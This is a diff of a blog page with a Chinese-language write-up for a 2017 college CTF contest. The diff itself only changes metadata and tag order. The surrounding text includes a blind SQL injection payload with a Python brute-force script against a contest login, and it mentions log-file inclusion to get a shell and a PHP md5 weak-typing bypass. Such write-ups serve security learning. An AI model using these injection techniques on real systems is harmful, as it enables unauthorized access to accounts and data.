@@ -15,7 +15,7 @@
 <meta property="og:url" content="www.xnianq.cn/2017/11/03/全国高校运维挑战赛wp-md/index.html">
 <meta property="og:site_name" content="xnianq&#39;blog">
 <meta property="og:description" content="2017全国高校运维赛write-up比赛排名rank9，兄弟们肝了一天，比赛体验还行，到最后两道题目时间不够，就没做出来，简单说下思路,simplecms是本地文件包含日志文件getshell，apache是一个原题http://blog.isis.poly.edu/2017/10/21/hacklu-ctf-indianer/，主办方改了改，我用get请求cat flag.txt并没有cat到">
-<meta property="og:updated_time" content="2017-11-03T01:46:46.000Z">
+<meta property="og:updated_time" content="2017-11-03T01:48:01.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2017全国高校运维挑战赛wp.md">
 <meta name="twitter:description" content="2017全国高校运维赛write-up比赛排名rank9，兄弟们肝了一天，比赛体验还行，到最后两道题目时间不够，就没做出来，简单说下思路,simplecms是本地文件包含日志文件getshell，apache是一个原题http://blog.isis.poly.edu/2017/10/21/hacklu-ctf-indianer/，主办方改了改，我用get请求cat flag.txt并没有cat到">
@@ -174,7 +174,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="2017全国高校运维赛write-up"><a href="#2017全国高校运维赛write-up" class="headerlink" title="2017全国高校运维赛write-up"></a>2017全国高校运维赛write-up</h1><p>比赛排名rank9，兄弟们肝了一天，比赛体验还行，到最后两道题目时间不够，就没做出来，简单说下思路,simplecms是本地文件包含日志文件getshell，apache是一个原题<a href="http://blog.isis.poly.edu/2017/10/21/hacklu-ctf-indianer/，主办方改了改，我用get请求cat" target="_blank" rel="external">http://blog.isis.poly.edu/2017/10/21/hacklu-ctf-indianer/，主办方改了改，我用get请求cat</a> flag.txt并没有cat到，比赛过后，试了一下post，妈的居然成功了，就很气。<br>在这就简单写一下这次我们做出来的题目的wp吧。(有点懒，都没有图，逃……</p>
+        <h1 id="2017全国高校运维赛write-up"><a href="#2017全国高校运维赛write-up" class="headerlink" title="2017全国高校运维赛write-up"></a>2017全国高校运维赛write-up</h1><p>比赛排名rank9，兄弟们肝了一天，比赛体验还行，到最后两道题目时间不够，就没做出来，简单说下思路,simplecms是本地文件包含日志文件getshell，apache是一个原题<a href="http://blog.isis.poly.edu/2017/10/21/hacklu-ctf-indianer/，主办方改了改，我用get请求cat" target="_blank" rel="external">http://blog.isis.poly.edu/2017/10/21/hacklu-ctf-indianer/，主办方改了改，我用get请求cat</a> flag.txt并没有cat到，比赛过后，试了一下post，妈的居然成功了，就很气。<br>在这就简单写一下这次我们做出来的题目的wp吧。(有点懒，都没有图，逃……<br><a id="more"></a></p>
 <h2 id="web100-login"><a href="#web100-login" class="headerlink" title="web100 login"></a>web100 login</h2><p>在index.php就看到了注释，提示密码的字段是pwd，不用想嘛，一看就是注入，还是盲注。所以就fuzz了一下过滤的字符，[‘and’,’ ‘,’select’,’union’,’sleep’….]这些都过滤了，不过没有过滤if还有&amp;&amp;这样的话，利用了下判断逻辑，如果是1，返回password error，如果是0，返回invailed user。<br>payload：data = {‘uname’:”admin’&amp;&amp;if((pwd&gt;’”+password1+”‘),”+”1,0)&amp;&amp;’1’=’1”,’pwd’:’123’}<br>最后脚本如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">'http://202.112.26.124:8080/fb69d7b4467e33c71b0153e62f7e2bf0/index.php'</span></div><div class="line"></div><div class="line">string = <span class="string">'0123456789abcdefghigklmnopqrstuvwxyz'</span></div><div class="line">password1 = <span class="string">'fsaoaigafsd'</span></div><div class="line"></div><div class="line">password = <span class="string">'fsaoaigafsd'</span></div><div class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(ord(<span class="string">'a'</span>),ord(<span class="string">'z'</span>)+<span class="number">1</span>):</div><div class="line">        <span class="comment">#print password1</span></div><div class="line">        password1 = password1+chr(i)</div><div class="line">        <span class="comment">#print password1</span></div><div class="line">        data = &#123;<span class="string">'uname'</span>:<span class="string">"admin'&amp;&amp;if((pwd&gt;'"</span>+password1+<span class="string">"'),"</span>+<span class="string">"1,0)&amp;&amp;'1'='1"</span>,<span class="string">'pwd'</span>:<span class="string">'123'</span>&#125;</div><div class="line">        <span class="comment">#print "'&amp;&amp;if((pwd&gt;'"+chr(i)+"'),1,0)&amp;&amp;'1'='1"</span></div><div class="line">        t = requests.post(url=url,data=data)</div><div class="line">        <span class="comment">#print t.content</span></div><div class="line">        <span class="comment">#print password1</span></div><div class="line">        <span class="keyword">if</span> <span class="string">'user'</span> <span class="keyword">in</span> t.content:</div><div class="line">            <span class="keyword">print</span> chr(i<span class="number">-1</span>)</div><div class="line">            password = password+chr(i<span class="number">-1</span>)</div><div class="line">            password1 = password</div><div class="line">            <span class="keyword">print</span> password</div><div class="line">            <span class="keyword">break</span></div><div class="line">        password1 = password</div></pre></td></tr></table></figure>
 <h2 id="web2-不是管理员也可以login"><a href="#web2-不是管理员也可以login" class="headerlink" title="web2 不是管理员也可以login"></a>web2 不是管理员也可以login</h2><p>这道题目还是很简单的，虽然题目界面看起来就让人不想做，但是考的点子还是很基础的。一开始在导航栏这边全部访问了一下，在帮助和说明这一栏还有源代码里面发现了判断逻辑，大致就是判断用户名的md5是不是0，然后判断密码进行反序列化之后的值是不是==’xx’。总的说嘛，就是弱类型啊。<br>md5($str)==0,$str可以是240610708，password使用序列化脚本跑出来就好.</p>
@@ -453,15 +453,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">crypto</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">crypto</a>
               </li>
              
               <li class="article-tag-list-item">
